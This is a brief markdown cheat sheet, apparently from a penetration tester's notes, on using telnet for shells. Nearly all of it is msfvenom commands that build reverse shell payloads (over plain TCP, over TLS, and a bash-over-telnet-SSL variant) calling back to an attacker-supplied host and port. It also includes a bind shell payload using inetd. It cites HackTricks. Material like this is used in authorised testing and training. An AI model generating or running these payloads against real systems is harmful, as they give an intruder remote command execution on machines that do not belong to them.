# Manual

## 01 - Common Files

```
/usr/bin/telnet
```

## 02 - Generate Payloads

### 2.1 - Reverse Shells

#### 2.1.1 - TCP Protocol

```
$ msfvenom -p cmd/unix/reverse shellpath=/bin/sh [telnetpath=/path/to/telnet] lhost=<IP> lport=<PORT>
```

#### 2.1.2 - TLS Protocol

You can include TLS certificate to encrypt communication.

```
$ msfvenom -p cmd/unix/reverse_ssl_double_telnet shellpath=/bin/sh [telnetpath=/path/to/telnet] handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

Generate a reverse shell telnet via bash prompt.

```
$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

### 2.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_inetd lport=<PORT>
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)